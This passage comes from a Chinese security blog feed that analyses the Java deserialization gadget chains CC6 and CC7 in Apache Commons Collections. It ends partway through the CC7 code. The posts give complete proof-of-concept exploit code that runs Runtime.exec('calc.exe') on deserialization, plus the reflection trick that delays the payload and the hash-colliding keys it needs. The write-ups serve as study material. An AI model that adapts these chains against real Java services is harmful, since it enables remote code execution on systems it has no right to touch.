class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="HashSet链分析"><a href="#HashSet链分析" class="headerlink" title="HashSet链分析"></a>HashSet链分析</h3><p><a href="https://github.com/frohoff/ysoserial">ysoserial</a>给的链子是HashSet链：</p><p><img src="/archives/7db87f98/image-20250624233834589-1752457148424108.png" alt="image-20250624233834589"></p><p>对比HashCode链可以看出这条链依旧是通过<code>TiedMapEntry.hashCode()-&gt;TiedMapEntry.getValue()</code>来调用LazyMap.get()，但唯一不同的是触发TiedMapEntry.hashCode()是通过HashMap.put()来触发。正如前面我们提到的，HashMap.put()和HashMap.readObject()最后都是调用<code>putVal(hash(key))</code>，都能触发**TiedMapEntry.hashCode()**。</p><p>但HashMap.put()我们最后是能触发LazyMap.get()，但我们还需要一个起点，于是我们搜索<code>map.put(</code>，成功找到HashSet.readObject()：</p><p><img src="/archives/7db87f98/image-20250626155718903-1752457148424109.png" alt="image-20250626155718903"></p><p><img src="/archives/7db87f98/image-20250626155651746-1752457148424110.png" alt="image-20250626155651746"></p><p>恰好HashSet类中readObject方法恰好调用了map.put()，而且map也正是我们想要的HashMap对象，同时HashSet是可序列化的。但还有个问题，虽然我们能触发Hash.put()方法了，但我们是通过HashMap.put()-&gt;HashMap.hash(key)-&gt;HashMap.key.hashCode()。所以我们还需要key可控，即e可控：</p><p><img src="/archives/7db87f98/image-20250626164743797-1752457148424111.png" alt="image-20250626164743797"></p><p>HashSet提供了add方法，这样就使得e可控了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        Transformer[] faketransformers = new Transformer[]&#123;new ConstantTransformer(1)&#125;;</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">Runtime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        InvokerTransformer getRuntime=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer invoke=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer exec=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;Runtime,getRuntime,invoke,exec,l&#125;;        </span><br><span class="line">        ChainedTransformer chain=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map innermap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map Lazymap=LazyMap.decorate(innermap, chain);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lazymap,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        HashSet map=<span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        map.add(tiedMapEntry);</span><br><span class="line">        </span><br><span class="line"><span class="comment">//        Field field=chain.getClass().getDeclaredField(&quot;iTransformers&quot;);</span></span><br><span class="line"><span class="comment">//        field.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        field.set(chain,transformers);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(map);</span></span><br><span class="line"><span class="comment">//        unserialize();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/7db87f98/image-20250626165323231-1752457148424112.png" alt="image-20250626165323231"></p><p>但依旧存在问题，可以看到，就算我们不进行反序列化依旧能弹计算机，这是因为<code>map.add(tiedMapEntry);</code>传入tiedMapEntry对象后，而恰好add里面有和readObject的map.put()方法，于是直接把我们的链子走了一遍，弹了计算机。</p><p>解决这个问题的思路和HashMap链是一样的，就是通过先在tiedMapEntry对象中传入一个假payload的LazyMap对象，然后执行完add方法添加了e后再通过反射将payload改回去，即改字段iTransformers的值。</p><p>最终poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">Runtime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        InvokerTransformer getRuntime=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer invoke=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer exec=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;Runtime,getRuntime,invoke,exec,l&#125;;</span><br><span class="line">        ChainedTransformer chain=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">        Map innermap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map Lazymap=LazyMap.decorate(innermap, chain);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lazymap,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        HashSet map=<span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        map.add(tiedMapEntry);</span><br><span class="line">        innermap.remove(<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field=chain.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chain,transformers);</span><br><span class="line"></span><br><span class="line">        serialize(map);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/7db87f98/image-20250626170253897-1752457148424113.png" alt="image-20250626170253897"></p><p>注意LazyMap.get()执行的条件，<code>innermap.remove(&quot;b1uel0n3&quot;);</code>键名不存在时触发，也是成功弹计算机了</p><p>完整利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream -&gt; readObject()</span><br><span class="line">HashSet -&gt; readObject()</span><br><span class="line">HashMap -&gt; put()</span><br><span class="line">HashMap -&gt; hash(key)</span><br><span class="line">TiedMapEntry -&gt; hashCode()</span><br><span class="line">TiedMapEntry -&gt; getValue()</span><br><span class="line">LazyMap -&gt; get()</span><br><span class="line">ChainedTransformer -&gt; transform()</span><br><span class="line">ConstantTransformer -&gt; transform()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://changeyourway.github.io/2024/05/13/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC6%E9%93%BE%E5%88%86%E6%9E%90/">https://changeyourway.github.io/2024/05/13/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC6%E9%93%BE%E5%88%86%E6%9E%90/</a></p><p><a href="https://nivi4.notion.site/Java-CommonCollections6-b3a2ddf3ab16403699363c2ede802fcb">https://nivi4.notion.site/Java-CommonCollections6-b3a2ddf3ab16403699363c2ede802fcb</a></p><p><a href="https://www.freebuf.com/articles/web/336628.html">https://www.freebuf.com/articles/web/336628.html</a></p><p><a href="https://curlysean.github.io/2025/02/24/CC6%E9%93%BE/">https://curlysean.github.io/2025/02/24/CC6%E9%93%BE/</a></p><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
          <category> CC链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化：CC7利用链深度解析</title>
      <link href="/archives/6a901b58/"/>
      <url>/archives/6a901b58/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CC7思路一样是通过找到另外一条链来调用LazyMap.get()方法</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li><strong>jdk 8u71</strong></li><li><strong>Commons Collection 3.2.1</strong></li></ul><h2 id="CC7分析"><a href="#CC7分析" class="headerlink" title="CC7分析"></a>CC7分析</h2><p>先看ysoserial中给出的调用链：</p><p><img src="/archives/6a901b58/image-20250707204633007.png" alt="image-20250707204633007"></p><p>可以看到CC7是通过AbstractMap.equals来调用LazyMap.get()方法的</p><p><img src="/archives/6a901b58/image-20250707204954223.png" alt="image-20250707204954223"></p><p>在equals方法中会调m.get(key)方法，且m为传入的o，所以只需要将o传入为LazyMap对象即可。</p><p>继续往上找到AbstractMapDecorator.equals方法：</p><p><img src="/archives/6a901b58/image-20250707205502936.png" alt="image-20250707205502936"></p><p>该方法会调用map.equals(object)方法：</p><p><img src="/archives/6a901b58/image-20250707205601885.png" alt="image-20250707205601885"></p><p>而map也是我们可控的</p><p>继续往上跟进我们反序列化的起点Hashtable类：</p><p><img src="/archives/6a901b58/image-20250707211135937.png" alt="image-20250707211135937"></p><p>在Hashtable.readObject方法中调用了reconstitutionPut(table,key,value)方法，而Hashtable提供put方法，可通过put将key和value传入：</p><p><img src="/archives/6a901b58/image-20250708144015685.png" alt="image-20250708144015685"></p><p>注意会调用key.hashCode和entry.key.equals方法，它会将我们一开始的链子跑一遍，所以依然需要先传入假的faketransformers：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] faketransformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br></pre></td></tr></table></figure><p>跟进Hashtable.reconstitutionPut方法：</p><p><img src="/archives/6a901b58/image-20250707211403641.png" alt="image-20250707211403641"></p><p>当e!&#x3D;null时触发for循环，然后会判断<code>e.hash==hash&amp;&amp;e.key.equals(key)</code>。由于tab是用来储存键值对的，而在执行循环时会将tab[index]赋值给e，所以需要确保tab里有键值对，所以就需要在reconstitutionPut第一次遍历时将进行put一次传入键值对，然后在第二次遍历时再put一次作为key传入</p><p>而这里有个重要的点就是其实为了在调用AbstractMapDecorator.equals方法我们可以传入键值对都为LazyMap对象：</p><p><img src="/archives/6a901b58/image-20250707214902972.png" alt="image-20250707214902972"></p><p>这是因为LazyMap其实是继承AbstractMapDecorator类的，所以在执行e.key.equal时即执行LazyMap.equals()，由于LazyMap没有该方法，就会通过父类来执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ChainedTransformer chained=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">HashMap inner1=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">HashMap inner2=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">Map map1=LazyMap.decorate(inner1, chained);</span><br><span class="line">Map map2=LazyMap.decorate(inner2, chained);</span><br><span class="line">Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line"></span><br><span class="line">ht.put(map1,<span class="number">1</span>);</span><br><span class="line">ht.put(map2,<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>但实现equals方法还有一个条件就是<code>e.hash==hash</code>，而<code>hash=key.hashcode()</code>:</p><p><img src="/archives/6a901b58/image-20250707230221421.png" alt="image-20250707230221421"></p><p>即执行LazyMap.hashcode()，而LazyMap没有hashcode方法，就会执行父类AbstractMapDecorator.hashcode方法：</p><p><img src="/archives/6a901b58/image-20250707230432404.png" alt="image-20250707230432404"></p><p>由于是调用父类的方法，但这里的map还是我们一开始传入LazyMap的HashMap对象，即执行HashMap.hashcode()，但HashMap没有hashcode方法，所以调用父类AbstractMap.hashcode()方法：</p><p><img src="/archives/6a901b58/image-20250707231711401.png" alt="image-20250707231711401"></p><p>这里需要遍历键值对，没有就会直接返回，而HashMap并没有键值对，所以需要传入键值对，HashMap类存在put方法传入键值对：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">inner1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">inner2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">Map map1=LazyMap.decorate(inner1, chained);</span><br><span class="line">map1.put(<span class="string">&quot;b1uel0n3&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Map map2=LazyMap.decorate(inner2, chained);</span><br><span class="line">map2.put(<span class="string">&quot;aaa&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line"></span><br><span class="line">ht.put(map1,<span class="number">1</span>);</span><br><span class="line">ht.put(map2,<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>然后我们看下两组的hashcode()值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(map1.hashCode());</span><br><span class="line">System.out.println(map2.hashCode());</span><br></pre></td></tr></table></figure><p><img src="/archives/6a901b58/image-20250708145047827.png" alt="image-20250708145047827"></p><p>显然是不等的，而ysoserial提供了两组hash相等的值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yy与zZ</span><br><span class="line">Ea与FB</span><br></pre></td></tr></table></figure><p><img src="/archives/6a901b58/image-20250708145807145.png" alt="image-20250708145807145"></p><p><img src="/archives/6a901b58/image-20250708145850859.png" alt="image-20250708145850859"></p><p>这里我用的是第一个：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.AbstractMapDecorator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] faketransformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chained=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">inner1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">inner2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        Map map1=LazyMap.decorate(inner1, chained);</span><br><span class="line">        inner1.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Map map2=LazyMap.decorate(inner2, chained);</span><br><span class="line">        inner2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line"></span><br><span class="line">        ht.put(map1,<span 